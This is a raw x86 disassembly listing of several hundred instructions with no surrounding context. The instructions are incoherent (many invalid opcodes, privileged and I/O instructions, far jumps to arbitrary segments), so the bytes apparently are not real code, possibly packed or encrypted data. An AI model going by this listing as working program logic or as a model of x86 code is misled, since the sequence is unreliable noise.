  41471b:	add    BYTE PTR [esi+0x46],dl
  41471e:	jl     0x41478b
  414720:	popa   
  414721:	loope  0x414745
  414723:	mov    bl,0x96
  414725:	jecxz  0x414743
  414727:	dec    edi
  414728:	pop    ebx
  414729:	retf   0xc99f
  41472c:	jnp    0x4146fc
  41472e:	sar    BYTE PTR ds:0xa0a196e4,1
  414734:	inc    esi
  414735:	fdivr  QWORD PTR [ebx-0x722c9e0b]
  41473b:	mov    ss,WORD PTR [esi]
  41473d:	fdivr  QWORD PTR [eax-0x63]
  414740:	adc    cl,bl
  414742:	lods   eax,DWORD PTR ds:[esi]
  414743:	mov    dh,0x9c
  414745:	or     ebp,0xc25474b7
  41474b:	push   ds
  41474c:	sti    
  41474d:	xchg   edi,eax
  41474e:	mov    bl,0x8d
  414750:	jmp    0xa935:0xa4003070
  414757:	lds    edi,FWORD PTR [ecx]
  414759:	mov    ds:0x817fa1f0,eax
  41475e:	mov    eax,ds:0x4af4434d
  414763:	arpl   WORD PTR [eax],dx
  414765:	jge    0x414789
  414767:	add    eax,0x4c482501
  41476c:	pop    ecx
  41476d:	outs   dx,DWORD PTR ds:[esi]
  41476e:	pusha  
  41476f:	test   DWORD PTR [ecx-0xc21cc21],esi
  414775:	push   edi
  414776:	cmc    
  414777:	(bad)  
  414779:	mov    cl,0x5a
  41477b:	sti    
  41477c:	sbb    al,0x15
  41477e:	out    0x5b,al
  414780:	or     bl,BYTE PTR [ecx-0x64ee5e74]
  414786:	mov    bh,0x43
  414788:	shr    esp,cl
  41478a:	sub    ch,0xf2
  41478d:	fmul   QWORD PTR [edi-0x56]
  414790:	mov    ch,0xb3
  414792:	mov    edi,0x5f27e933
  414797:	sub    al,0xf6
  414799:	adc    ch,dh
  41479b:	add    dl,BYTE PTR [esi]
  41479d:	sbb    al,0x9d
  41479f:	cmp    ebp,ebp
  4147a1:	enter  0x56f,0x4d
  4147a5:	sub    eax,0x71e77dad
  4147aa:	pop    edi
  4147ab:	or     ah,BYTE PTR [esp+ebx*1+0x6f]
  4147af:	das    
  4147b0:	ret    0x4f5a
  4147b3:	lods   al,BYTE PTR ds:[esi]
  4147b4:	sub    ch,dh
  4147b6:	sub    edi,esi
  4147b8:	lock fwait
  4147ba:	or     al,0x26
  4147bc:	jb     0x414782
  4147be:	jle    0x414827
  4147c0:	cs xor ah,al
  4147c3:	ror    DWORD PTR [esi-0x126db26],cl
  4147c9:	ret    
  4147ca:	out    0xaa,al
  4147cc:	jmp    0xb8da2611
  4147d1:	dec    edi
  4147d2:	inc    esp
  4147d3:	aam    0xed
  4147d5:	out    dx,al
  4147d6:	mov    esi,0xffe766db
  4147db:	jno    0x414826
  4147dd:	stos   DWORD PTR es:[edi],eax
  4147de:	cmp    bl,BYTE PTR [ebx+ebp*1+0x19]
  4147e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147e3:	clc    
  4147e4:	jns    0x4147d4
  4147e6:	xor    BYTE PTR [esi],ch
  4147e8:	mov    eax,0x8da6f22b
  4147ed:	pop    ecx
  4147ee:	ss fs jns 0x41477a
  4147f2:	xchg   ecx,eax
  4147f3:	fdiv   DWORD PTR [esi]
  4147f5:	sti    
  4147f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147f7:	add    ebx,DWORD PTR [ebx+esi*4+0x2b932bf9]
  4147fe:	jnp    0x414821
  414800:	push   ds
  414801:	sbb    edi,ebx
  414803:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414804:	js     0x4147b0
  414806:	mov    esi,0x11b79baf
  41480b:	dec    eax
  41480c:	(bad)  [ebp+eax*8+0x4b]
  414810:	dec    ebp
  414811:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414812:	adc    bh,BYTE PTR [ebx+0x25f994fb]
  414818:	mov    ebx,0xf35ae949
  41481d:	sub    eax,0xf761f7ae
  414822:	jnp    0x414851
  414824:	clc    
  414825:	mov    dl,0x8c
  414827:	shl    BYTE PTR [edi],1
  414829:	in     eax,dx
  41482a:	out    0xeb,al
  41482c:	jne    0x4147e8
  41482e:	in     eax,0x73
  414830:	(bad)  
  414831:	icebp  
  414832:	mov    gs,WORD PTR [edi-0x6bcd954b]
  414838:	pop    ss
  414839:	hlt    
  41483a:	sub    al,0xec
  41483c:	das    
  41483d:	xchg   edi,eax
  41483e:	pop    edx
  41483f:	sbb    BYTE PTR [edx+0x2adc7b92],ah
  414845:	stos   BYTE PTR es:[edi],al
  414846:	or     bl,BYTE PTR [edx]
  414848:	and    bl,bl
  41484a:	cmp    DWORD PTR [eax-0x30345c90],ebp
  414850:	loope  0x41488f
  414852:	cwde   
  414853:	inc    edi
  414854:	fs push edx
  414856:	shl    DWORD PTR [esi-0x72],0x23
  41485a:	dec    ecx
  41485b:	xor    ecx,DWORD PTR [ebp+0x67a6bbe2]
  414861:	xor    ecx,0xf9586b11
  414867:	mov    ebp,0xb4643672
  41486c:	enter  0x3a12,0xdf
  414870:	(bad)  
  414871:	fdivr  DWORD PTR ds:0xa754b100
  414877:	std    
  414878:	adc    al,0x44
  41487a:	cdq    
  41487b:	mov    ch,0x43
  41487d:	jge    0x41481f
  41487f:	pop    ecx
  414880:	or     dl,bl
  414882:	(bad)  
  414883:	rep ins BYTE PTR es:[edi],dx
  414885:	push   es
  414886:	pop    ss
  414887:	loope  0x4148c4
  414889:	inc    eax
  41488a:	in     al,0xb7
  41488c:	inc    ecx
  41488d:	mov    eax,0x5ccc4f9b
  414892:	repnz add DWORD PTR [esi+ecx*2-0x59638b9f],ebp
  41489a:	test   al,0x29
  41489c:	xchg   BYTE PTR [edi],bh
  41489e:	push   ds
  41489f:	xchg   esi,eax
  4148a0:	xchg   BYTE PTR [ecx+eax*4],bh
  4148a3:	inc    esp
  4148a4:	jns    0x414856
  4148a6:	pop    esp
  4148a7:	dec    eax
  4148a8:	mov    ebp,0x918abc8f
  4148ad:	sbb    BYTE PTR [ecx-0x428d3182],0xc8
  4148b4:	mov    BYTE PTR [esi+0x3e],dl
  4148b7:	aad    0xf5
  4148b9:	adc    al,0xc2
  4148bb:	cmp    DWORD PTR fs:[eax+0x29],ebx
  4148bf:	xchg   esi,eax
  4148c0:	cmp    esi,DWORD PTR [eax]
  4148c2:	clc    
  4148c3:	lods   eax,DWORD PTR ds:[esi]
  4148c4:	(bad)  
  4148c5:	push   esi
  4148c6:	icebp  
  4148c7:	and    edi,DWORD PTR [ebx-0xf]
  4148ca:	les    esp,FWORD PTR [edx+0x713eaa1a]
  4148d0:	mov    ch,0xb7
  4148d2:	cmp    DWORD PTR [esi-0x8],esi
  4148d5:	pop    eax
  4148d6:	jnp    0x414901
  4148d8:	or     ebp,edi
  4148da:	loopne 0x4148ec
  4148dc:	mov    dh,0x18
  4148de:	pop    ebp
  4148df:	mov    dl,0x92
  4148e1:	pop    ecx
  4148e2:	jbe    0x414895
  4148e4:	mov    ?,esi
  4148e6:	pop    ss
  4148e7:	movzx  ebp,bx
  4148ea:	inc    esi
  4148eb:	xlat   BYTE PTR ds:[ebx]
  4148ec:	fisub  WORD PTR [ebp+0x2d]
  4148ef:	lock pop ebx
  4148f2:	loopne 0x414934
  4148f4:	rol    BYTE PTR ds:0x81dd3437,1
  4148fa:	push   ss
  4148fb:	int3   
  4148fc:	push   edx
  4148fd:	jmp    0xf341b908
  414902:	pop    ebx
  414903:	inc    edx
  414904:	jns    0x4148a1
  414906:	arpl   WORD PTR [eax+0x5966911c],sp
  41490c:	add    eax,DWORD PTR ds:0xdadb0f53
  414912:	inc    eax
  414913:	ror    BYTE PTR [edx-0x66658ac7],cl
  414919:	push   esi
  41491a:	shl    DWORD PTR [esp+eax*1-0x2],cl
  41491e:	xor    esp,eax
  414920:	lods   eax,DWORD PTR ds:[esi]
  414921:	push   cs
  414922:	ins    BYTE PTR es:[edi],dx
  414923:	sub    al,0x3a
  414925:	aam    0xe8
  414927:	pop    ds
  414928:	jno    0x41497c
  41492a:	xchg   edi,eax
  41492b:	sub    esp,DWORD PTR [eax]
  41492d:	gs sub esp,eax
  414930:	mov    bh,BYTE PTR ds:[ecx-0x3869055a]
  414937:	inc    ecx
  414938:	scas   eax,DWORD PTR es:[edi]
  414939:	push   0x501b742e
  41493e:	push   eax
  41493f:	lods   al,BYTE PTR ds:[esi]
  414940:	fisubr DWORD PTR [eax]
  414942:	hlt    
  414943:	mov    fs,esp
  414945:	hlt    
  414946:	rcl    DWORD PTR [ebx-0x36a1cb18],cl
  41494c:	je     0x4149a6
  41494e:	(bad)  
  41494f:	sub    eax,0x18ecdf8e
  414954:	xor    cl,BYTE PTR [ebp+0x48faa5bd]
  41495a:	in     eax,0x80
  41495c:	test   DWORD PTR [ebx+eiz*1-0x47],0x20ef4204
  414964:	fstp   QWORD PTR gs:[edi]
  414967:	adc    al,BYTE PTR [ebp+0x67]
  41496a:	fwait
  41496b:	pushf  
  41496c:	and    eax,0x411ba40c
  414971:	daa    
  414972:	test   eax,0x14aee422
  414977:	cdq    
  414978:	mov    ch,0x39
  41497a:	out    0x13,eax
  41497c:	sub    ch,dh
  41497e:	jbe    0x4149cb
  414980:	xchg   edx,eax
  414981:	scas   eax,DWORD PTR es:[edi]
  414982:	mov    WORD PTR [edi+0x7c307136],cs
  414988:	in     eax,dx
  414989:	push   ebp
  41498a:	push   ebx
  41498b:	push   ss
  41498c:	add    BYTE PTR [edi-0x117360fe],ch
  414992:	mov    DWORD PTR [ebx-0xbc8bd30],eax
  414998:	retf   
  414999:	pop    ds
  41499a:	jmp    0x6b4a:0xc9f61715
  4149a1:	(bad)  
  4149a2:	cs lock xor dl,dl
  4149a6:	inc    esi
  4149a7:	retf   0xce87
  4149aa:	jno    0x41492d
  4149ac:	rol    esp,1
  4149ae:	shr    BYTE PTR [esi+0x7c69bca3],0xe0
  4149b5:	jge    0x4149e0
  4149b7:	mov    esp,0x6b6ee0c2
  4149bc:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4149be:	add    BYTE PTR [edi-0x52],cl
  4149c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149c2:	mov    dl,0xfb
  4149c4:	in     eax,0x0
  4149c6:	or     eax,0x6d94a520
  4149cb:	loopne 0x41499b
  4149cd:	mov    ecx,DWORD PTR [ecx-0x761ecf02]
  4149d3:	add    al,0x7a
  4149d5:	jno    0x4149cf
  4149d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149d8:	fwait
  4149d9:	jne    0x414971
  4149db:	lods   al,BYTE PTR ds:[esi]
  4149dc:	or     al,0xa1
  4149de:	mov    eax,es
  4149e0:	gs inc ebp
  4149e2:	lahf   
  4149e3:	in     eax,dx
  4149e4:	mov    DWORD PTR [eax+esi*2-0x285c05ee],ecx
  4149eb:	cmp    DWORD PTR [edi-0x5a],esp
  4149ee:	mov    ds:0x998b3ec4,eax
  4149f3:	shl    DWORD PTR [ebp-0x51],cl
  4149f6:	dec    ebx
  4149f7:	xchg   esp,eax
  4149f8:	in     al,0x4e
  4149fa:	sbb    edi,DWORD PTR [esi]
  4149fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149fd:	sahf   
  4149fe:	mov    eax,0xea32bbb2
  414a03:	jl     0x414994
  414a05:	wrmsr  
  414a07:	inc    esi
  414a08:	into   
  414a09:	mov    ds:0xd3478038,al
  414a0e:	call   ecx
  414a10:	push   ecx
  414a11:	lock sbb dh,BYTE PTR [esp+ebp*8-0x6d]
  414a16:	inc    ebx
  414a17:	pop    edi
  414a18:	je     0x4149fe
  414a1a:	fwait
  414a1b:	pop    ds
  414a1c:	xor    esi,DWORD PTR [edx-0x31]
  414a1f:	adc    esi,DWORD PTR [eax-0x41]
  414a22:	push   ebp
  414a23:	xchg   BYTE PTR [esi-0x227e572a],cl
  414a29:	xor    al,0xff
  414a2b:	mov    ah,0x21
  414a2d:	mov    dh,0x7f
  414a2f:	repnz inc edx
  414a31:	call   DWORD PTR [eax+0x74e09853]
  414a37:	je     0x414a57
  414a39:	pop    ebp
  414a3a:	lock push esp
  414a3c:	pop    ss
  414a3d:	jmp    0x414aa6
  414a3f:	test   al,dl
  414a41:	push   edx
  414a42:	scas   al,BYTE PTR es:[edi]
  414a43:	push   ds
  414a44:	(bad)  
  414a45:	xchg   ebx,eax
  414a46:	lods   al,BYTE PTR ds:[esi]
  414a47:	push   0x4d
  414a49:	enter  0x53ba,0x44
  414a4d:	mov    ch,0xfc
  414a4f:	sub    DWORD PTR [ecx-0x40],esi
  414a52:	add    BYTE PTR ds:0x6aa756be,ch
  414a58:	and    BYTE PTR [esi+0x50],0x45
  414a5c:	aaa    
  414a5d:	jo     0x414a04
  414a5f:	and    eax,0xa7bc34d8
  414a64:	jb     0x414ac3
  414a66:	or     DWORD PTR [ebx],ecx
  414a68:	add    al,0x26
  414a6a:	xchg   edi,eax
  414a6b:	and    esi,DWORD PTR [ebx]
  414a6d:	clc    
  414a6e:	out    dx,al
  414a6f:	ins    DWORD PTR es:[edi],dx
  414a70:	jno    0x414ac5
  414a72:	in     al,dx
  414a73:	and    al,0xa2
  414a75:	leave  
  414a76:	sub    esp,edi
  414a78:	inc    ecx
  414a79:	aas    
  414a7a:	test   eax,0xe6a32de5
  414a7f:	mov    bl,0x1a
  414a81:	jmp    0x50c5:0x6158ad6b
  414a88:	popa   
  414a89:	imul   esi,ebx,0xffffffba
  414a8c:	call   0xd046:0x3b3f8bc7
  414a93:	push   esi
  414a94:	cmp    eax,DWORD PTR [edx-0x356b2adf]
  414a9a:	sub    edx,DWORD PTR [ebx]
  414a9c:	mov    es,WORD PTR [edx]
  414a9e:	loop   0x414a24
  414aa0:	icebp  
  414aa1:	push   eax
  414aa2:	push   ss
  414aa3:	shr    DWORD PTR [ebx+0x49],1
  414aa6:	xchg   ecx,eax
  414aa7:	xchg   esi,eax
  414aa8:	arpl   bp,ax
  414aaa:	push   0x19
  414aac:	or     bl,al
  414aae:	xor    al,0xfe
  414ab0:	dec    edx
  414ab1:	and    BYTE PTR [esi],0x3c
  414ab4:	pop    edx
  414ab5:	mov    ch,0xb4
  414ab7:	shr    BYTE PTR [edi+0x5260fcb7],cl
  414abd:	dec    eax
  414abe:	mov    dh,0x46
  414ac0:	sbb    ah,bl
  414ac2:	fwait
  414ac3:	xor    BYTE PTR [edi],cl
  414ac5:	adc    eax,DWORD PTR [bp+0x6dcc]
  414aca:	mov    esp,0x4684aa82
  414acf:	lods   al,BYTE PTR ds:[esi]
  414ad0:	mov    ds:0xeaea7629,eax
  414ad5:	lock icebp 
  414ad7:	jo     0x414b46
  414ad9:	sbb    DWORD PTR [edi-0x38c62ec9],esi
  414adf:	fild   WORD PTR [ecx+0x5a]
  414ae2:	jbe    0x414ad6
  414ae4:	push   ecx
  414ae5:	aam    0x88
  414ae7:	inc    ebp
  414ae8:	pop    ecx
  414ae9:	or     esi,ebp
  414aeb:	sahf   
  414aec:	pop    ecx
  414aed:	je     0x414b1a
  414aef:	aad    0xd8
  414af1:	xchg   ebp,eax
  414af2:	adc    BYTE PTR [edi+0x2bb5ecd],bh
  414af8:	push   esp
  414af9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414afa:	push   ebp
  414afb:	or     BYTE PTR [ecx],0xb4
  414afe:	js     0x414afc
  414b00:	test   al,0xa
  414b02:	and    ebx,ebp
  414b04:	lods   eax,DWORD PTR ds:[esi]
  414b05:	xlat   BYTE PTR ds:[ebx]
  414b06:	and    eax,0x9433218c
  414b0b:	or     eax,0xe78edb56
  414b10:	call   0xcc1d:0x4c9178a5
  414b17:	scas   al,BYTE PTR es:[edi]
  414b18:	loopne 0x414b2c
  414b1a:	arpl   WORD PTR [ebx-0x27],cx
  414b1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b1e:	imul   ecx,DWORD PTR cs:[edi+0x16b1ba03],0x5a
  414b26:	pop    esi
  414b27:	test   al,0xa9
  414b29:	ja     0x414b96
  414b2b:	das    
  414b2c:	fwait
  414b2d:	add    bh,BYTE PTR [ebx-0x36]
  414b30:	dec    edx
  414b31:	inc    esi
  414b32:	rcl    DWORD PTR [ebx],cl
  414b34:	pop    eax
  414b35:	mov    dl,0x55
  414b37:	imul   esp,DWORD PTR [edx+0x58b16b42],0xffffffd4
  414b3e:	sub    DWORD PTR [edi],esp
  414b40:	cmp    DWORD PTR [ebp+0x63],0xaeb99761
  414b47:	in     eax,dx
  414b48:	add    al,0x87
  414b4a:	cmp    DWORD PTR [eax+0x5bcb04a6],esi
  414b50:	ins    DWORD PTR es:[edi],dx
  414b51:	mov    DWORD PTR [edi-0xe767574],edi
  414b57:	cld    
  414b58:	adc    DWORD PTR [edi+0x4d6052ed],esi
  414b5e:	mov    edx,0xc30d4a53
  414b63:	mov    ebx,0xcd82a6de
  414b68:	xchg   esp,eax
  414b69:	adc    DWORD PTR [esi+0xe],edx
  414b6c:	and    eax,0x6b79fd03
  414b71:	or     al,0x40
  414b73:	or     BYTE PTR [edi+0x4f],dl
  414b76:	fwait
  414b77:	dec    esp
  414b78:	jl     0x414b3e
  414b7a:	daa    
  414b7b:	and    edi,eax
  414b7d:	repz xor eax,eax
  414b80:	xor    esi,DWORD PTR [ecx]
  414b82:	lods   eax,DWORD PTR ds:[esi]
  414b83:	sbb    al,0x4d
  414b85:	fisttp DWORD PTR [ebp-0x7e]
  414b88:	sbb    DWORD PTR [edx+0x53776de6],0x23
  414b8f:	mov    al,0xd2
  414b91:	jle    0x414b2f
  414b93:	rcl    BYTE PTR [eax+0x23],1
  414b96:	clc    
  414b97:	pushf  
  414b98:	pushf  
  414b99:	loopne 0x414c00
  414b9b:	jle    0x414c14
  414b9d:	jbe    0x414b77
  414b9f:	dec    esp
  414ba0:	call   0x8fa1:0x35237dd4
  414ba7:	scas   al,BYTE PTR es:[edi]
  414ba8:	data16 loop 0x414b4b
  414bab:	xchg   DWORD PTR [ecx+0x30831c90],esi
  414bb1:	add    edx,DWORD PTR [esi]
  414bb3:	add    bh,dl
  414bb5:	jge    0x414b41
  414bb7:	jle    0x414bbe
  414bb9:	aad    0x23
  414bbb:	or     eax,0x4570af29
  414bc0:	fmul   QWORD PTR [esi-0x482ed929]
  414bc6:	bound  ebx,QWORD PTR [edi+0x23]
  414bc9:	cli    
  414bca:	rcl    DWORD PTR [edi-0x5f],cl
  414bcd:	adc    ebp,DWORD PTR ds:0x5eaa184
  414bd3:	data16 add ah,BYTE PTR [esi]
  414bd6:	mov    bh,0x70
  414bd8:	pop    ebp
  414bd9:	outs   dx,DWORD PTR ds:[esi]
  414bda:	dec    ebp
  414bdb:	mov    eax,DWORD PTR [edi-0x7a]
  414bde:	shl    DWORD PTR [edx+0x24],1
  414be1:	adc    al,0xb3
  414be3:	add    dh,bl
  414be5:	jne    0x414ba2
  414be7:	repnz sbb al,0xb
  414bea:	js     0x414b7c
  414bec:	cmp    edx,DWORD PTR [edi-0x51]
  414bef:	cwde   
  414bf0:	push   eax
  414bf1:	push   cs
  414bf2:	mov    ebp,0x206e930
  414bf7:	test   DWORD PTR [edx-0xb],ebx
  414bfa:	lahf   
  414bfb:	les    edx,FWORD PTR [ebp-0x313e1de2]
  414c01:	in     eax,dx
  414c02:	aam    0x4a
  414c04:	jg     0x414bc9
  414c06:	mov    dh,0x98
  414c08:	push   esp
  414c09:	and    eax,0x5996271
  414c0e:	dec    ebp
  414c0f:	cmc    
  414c10:	std    
  414c11:	adc    dh,BYTE PTR [ebx+0xf]
  414c14:	xchg   ebx,eax
  414c15:	out    0x6d,eax
  414c17:	out    0x7a,al
  414c19:	fwait
  414c1a:	retf   
  414c1b:	mov    al,BYTE PTR [eax]
  414c1d:	mov    ss,WORD PTR [edi+0xb0325e1]
  414c23:	jle    0x414c9f
  414c25:	rcl    dh,cl
  414c27:	idiv   ah
  414c29:	and    eax,0xfc31d837
  414c2e:	imul   eax,DWORD PTR [bp-0x7423],0x48
  414c34:	inc    esi
  414c35:	add    dl,cl
  414c37:	pop    ebx
  414c38:	test   ch,dh
  414c3a:	push   0xffffffad
  414c3c:	sbb    bl,dl
  414c3e:	out    dx,al
  414c3f:	push   es
  414c40:	test   BYTE PTR [eax+0x1387c94c],0x2c
  414c47:	out    dx,al
  414c48:	or     esp,DWORD PTR [ebp+0x9d174d8]
  414c4e:	sub    BYTE PTR [edi+0x45],0x2c
  414c52:	ja     0x414bfa
  414c54:	xor    al,0x56
  414c56:	pop    eax
  414c57:	lods   al,BYTE PTR ds:[esi]
  414c58:	jne    0x414bf2
  414c5a:	imul   eax,DWORD PTR [edx],0xb65ca066
  414c60:	inc    ecx
  414c61:	push   ebx
  414c62:	scas   al,BYTE PTR es:[edi]
  414c63:	js     0x414cdb
  414c65:	scas   eax,DWORD PTR es:[edi]
  414c66:	push   edx
  414c67:	fs push ebp
  414c69:	out    0x67,eax
  414c6b:	retf   0xd832
  414c6e:	add    DWORD PTR [edx+ebp*4+0x33],eax
  414c72:	pop    ecx
  414c73:	enter  0xb697,0x49
  414c77:	hlt    
  414c78:	fisub  WORD PTR [ecx-0x767c0496]
  414c7e:	pop    es
  414c7f:	mov    bh,0x8
  414c81:	inc    ebp
  414c82:	and    edi,ecx
  414c84:	(bad)  
  414c85:	fiadd  WORD PTR [edi-0x3c3892ee]
  414c8b:	inc    ecx
  414c8c:	mov    bh,0x5d
  414c8e:	hlt    
  414c8f:	ret    
  414c90:	and    eax,0x8484ff88
  414c95:	sub    ecx,DWORD PTR [esi]
  414c97:	(bad)  
  414c98:	sbb    eax,0x7ec15272
  414c9d:	arpl   WORD PTR [edx+0x4b],cx
  414ca0:	popf   
  414ca1:	dec    edi
  414ca2:	mov    al,0xba
  414ca4:	cmc    
  414ca5:	call   0xa392:0x1dcc1ed5
  414cac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cad:	adc    BYTE PTR [edi-0x7fa45f08],0x84
  414cb4:	test   DWORD PTR [ebx+0xb6fce20],0x89c69fa3
  414cbe:	dec    edi
  414cbf:	lods   eax,DWORD PTR ds:[esi]
  414cc0:	or     ch,al
  414cc2:	lock dec ecx
  414cc4:	pop    ebp
  414cc5:	retf   
  414cc6:	pushf  
  414cc7:	mov    ecx,0xa8b5be48
  414ccc:	fwait
  414ccd:	sbb    DWORD PTR [ecx+0x27],esp
  414cd0:	push   ecx
  414cd1:	sbb    esi,ebp
  414cd3:	fld    DWORD PTR [esi+0x7171a677]
  414cd9:	push   esp
  414cda:	shl    BYTE PTR [esi+ebx*4+0x56],0x88
  414cdf:	loope  0x414cb6
  414ce1:	fsub   DWORD PTR [ebx+eiz*8]
  414ce4:	lods   eax,DWORD PTR ds:[esi]
  414ce5:	push   0xf9e43510
  414cea:	pushf  
  414ceb:	push   esi
  414cec:	jae    0x414ca0
  414cee:	outs   dx,DWORD PTR ds:[esi]
  414cef:	mov    edi,0x96860825
  414cf4:	mov    edi,DWORD PTR [eax-0x64]
  414cf7:	test   DWORD PTR [ebx+eiz*2+0x6f],ecx
  414cfb:	xchg   ebp,eax
  414cfc:	mov    ch,dl
  414cfe:	xchg   ebp,eax
  414cff:	jge    0x414cce
  414d01:	sbb    ch,0xbb
  414d04:	cld    
  414d05:	lds    esp,FWORD PTR [esi-0x51]
  414d08:	mov    bh,0x4a
  414d0a:	add    eax,0xe6b7c8e2
  414d0f:	clc    
  414d10:	or     cl,BYTE PTR [ecx]
  414d12:	jae    0x414d5f
  414d14:	bound  ebp,QWORD PTR [edx-0x7c]
  414d17:	dec    ebp
  414d18:	ja     0x414d83
  414d1a:	outs   dx,BYTE PTR ds:[esi]
  414d1b:	sub    al,0x57
  414d1d:	mov    ds:0xdae74005,al
  414d22:	and    al,0xbc
  414d24:	push   esp
  414d25:	mov    edx,0x8cd6b0ff
  414d2a:	aaa    
  414d2b:	aam    0xb4
  414d2d:	add    BYTE PTR [ebx-0x33076008],cl
  414d33:	sbb    eax,DWORD PTR [edx]
  414d35:	les    ebx,FWORD PTR [eax+edi*1]
  414d38:	loop   0x414cc5
  414d3a:	cmp    eax,0x260d62c6
  414d3f:	mov    edi,0x87783bf
  414d44:	int3   
  414d45:	push   eax
  414d46:	and    al,0xdc
  414d48:	ret    
  414d49:	cmp    ch,ch
  414d4b:	aas    
  414d4c:	mov    ah,0x3c
  414d4e:	pop    edx
  414d4f:	ror    eax,0x55
  414d52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d53:	repz sbb esi,DWORD PTR [ebp+0x24c2f193]
  414d5a:	lods   al,BYTE PTR ds:[esi]
  414d5b:	dec    esp
  414d5c:	sbb    DWORD PTR [eax+ecx*4+0x63],edi
  414d60:	inc    ebx
  414d61:	lahf   
  414d62:	xlat   BYTE PTR gs:[ebx]
  414d64:	fnsave [ebx+0x6d]
  414d67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d68:	ret    
  414d69:	mov    esp,0xee82d37e
  414d6e:	push   0x56
  414d70:	call   0x2853:0x1408228e
  414d77:	clc    
  414d78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d79:	(bad)  [esi+0x7f]
  414d7c:	lods   eax,DWORD PTR ds:[esi]
  414d7d:	(bad)  
  414d7f:	out    0xcf,eax
  414d81:	sti    
  414d82:	fisubr DWORD PTR ds:0xb3230ac1
  414d88:	or     eax,0x6f87f07f
  414d8d:	lock xchg esi,eax
  414d8f:	mov    ds:0xea17ed35,al
  414d94:	mov    ds:0x29defec0,al
  414d99:	mov    ch,0x50
  414d9b:	adc    eax,0x998e8976
  414da0:	fstp   QWORD PTR [edi]
  414da2:	imul   esi,esi,0xae17ae77
  414da8:	enter  0x2785,0xbc
  414dac:	inc    esi
  414dad:	je     0x414dbd
  414daf:	sahf   
  414db0:	dec    edx
  414db1:	push   cs
  414db2:	in     eax,dx
  414db3:	push   es
  414db4:	sbb    eax,0x1fa33185
  414db9:	pop    ecx
  414dba:	test   DWORD PTR [esi],esi
  414dbc:	jno    0x414deb
  414dbe:	mov    edi,0x441b5e2
  414dc3:	pop    ecx
  414dc4:	aas    
  414dc5:	clc    
  414dc6:	mov    edi,0xbe44a4dc
  414dcb:	mov    esp,0x3501bdcf
  414dd0:	xchg   DWORD PTR [ecx],edx
  414dd2:	out    dx,al
  414dd3:	call   eax
  414dd5:	data16 sbb dh,BYTE PTR [ebx-0x5e286dd9]
  414ddc:	scas   al,BYTE PTR es:[edi]
  414ddd:	hlt    
  414dde:	dec    esi
  414ddf:	push   edx
  414de0:	ret    0xa14
  414de3:	daa    
  414de4:	fnstenv [edx+0x1a501b2b]
  414dea:	mov    ebp,0x36949345
  414def:	nop
  414df0:	loop   0x414e2e
  414df2:	ss mov esp,0x893c1b6c
  414df8:	pop    esp
  414df9:	and    al,0xf6
  414dfb:	cmp    al,0x9
  414dfd:	shr    DWORD PTR [edi-0xfbf343e],0x81
  414e04:	popa   
  414e05:	mov    ch,0x51
  414e07:	mov    dh,0x28
  414e09:	(bad)  
  414e0a:	test   DWORD PTR [ecx-0x513a57ba],0x1031652
  414e14:	pop    eax
  414e15:	repz ret 0x64c9
  414e19:	jnp    0x414da5
  414e1b:	in     eax,0x1b
  414e1d:	stc    
  414e1e:	push   ss
  414e1f:	jb     0x414de3
  414e21:	or     eax,0x2b04fd11
  414e26:	cli    
  414e27:	retf   0x7977
  414e2a:	popf   
  414e2b:	shl    BYTE PTR [edx-0x57],cl
  414e2e:	adc    BYTE PTR [eax+0x19],0x5b
  414e32:	dec    ecx
  414e33:	jecxz  0x414e13
  414e35:	mov    ds:0x3e15e9c4,eax
  414e3a:	mov    al,ds:0x12631ef4
  414e3f:	push   ds
  414e40:	adc    edi,esi
  414e42:	dec    esi
  414e43:	(bad)  
  414e44:	sti    
  414e45:	jmp    0xfd96:0x2313e22e
  414e4c:	xchg   edx,eax
  414e4d:	in     al,0x75
  414e4f:	add    ebp,DWORD PTR [ecx-0x71]
  414e52:	inc    edi
  414e53:	jnp    0x414e8d
  414e55:	gs nop
  414e57:	jns    0x414ea9
  414e59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e5a:	push   es
  414e5b:	call   0x7d2a388
  414e60:	test   al,0x1
  414e62:	mov    ebx,0xa3b6b253
  414e67:	mov    dl,0x51
  414e69:	add    eax,0xd7bf09a6
  414e6e:	xor    ecx,DWORD PTR [ecx-0x69]
  414e71:	(bad)  
  414e72:	sub    ah,dl
  414e74:	mov    dl,0xcf
  414e76:	add    BYTE PTR [ebx-0x18],bh
  414e79:	dec    ebp
  414e7a:	int    0x22
  414e7c:	fisubr WORD PTR [edx-0x4c]
  414e7f:	sbb    al,0x95
  414e81:	test   al,0xd
  414e83:	xchg   ebx,eax
  414e84:	add    DWORD PTR [esi*8+0x28fcdeac],edx
  414e8b:	(bad)  
  414e8c:	mov    ?,WORD PTR gs:[ebx+0x65]
  414e90:	ret    0xd3c4
  414e93:	pop    esp
  414e94:	mov    bh,0xe1
  414e96:	in     eax,0x44
  414e98:	popa   
  414e99:	imul   esi,esp,0x1321f27
  414e9f:	sub    DWORD PTR [esp+edi*8+0x21aa078d],edx
  414ea6:	mov    ecx,0xcf090d45
  414eab:	leave  
  414eac:	les    ecx,FWORD PTR [eax]
  414eae:	cld    
  414eaf:	push   cs
  414eb0:	push   es
  414eb1:	(bad)  
  414eb2:	mov    ebx,0x9f28ed70
  414eb7:	sar    DWORD PTR [ebp+0x41dfdf20],1
  414ebd:	stos   DWORD PTR es:[edi],eax
  414ebe:	pop    eax
  414ebf:	ss pushw ss
  414ec2:	pusha  
  414ec3:	loop   0x414ea8
  414ec5:	adc    eax,0x73e0d8a8
  414eca:	sub    bl,BYTE PTR [ebx]
  414ecc:	loope  0x414e98
  414ece:	pop    es
